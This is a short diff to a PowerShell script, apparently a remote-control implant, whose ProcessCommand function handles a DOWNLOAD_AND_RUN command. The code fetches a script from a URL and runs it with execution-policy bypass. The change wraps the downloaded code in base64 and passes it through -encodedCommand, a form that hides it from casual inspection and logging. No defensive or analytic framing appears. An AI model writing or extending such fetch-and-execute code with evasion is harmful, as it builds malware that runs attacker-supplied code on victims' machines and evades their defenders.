@@ -80,7 +80,12 @@ function ProcessCommand
             $webclient = New-Object Net.WebClient
             OutString "ProcessCommand: DOWNLOAD_AND_RUN  -- $file $url"
             $data = $webclient.DownloadString($url)
-            powershell.exe -exec bypass -C "$data"       
+
+            $bytes = [System.Text.Encoding]::Unicode.GetBytes($data)
+            $encodedCommand = [Convert]::ToBase64String($bytes)
+            powershell.exe -exec bypass -encodedCommand $encodedCommand
+
+           
         }
     }elseif($Command -like "SENDSTATUS"){
 
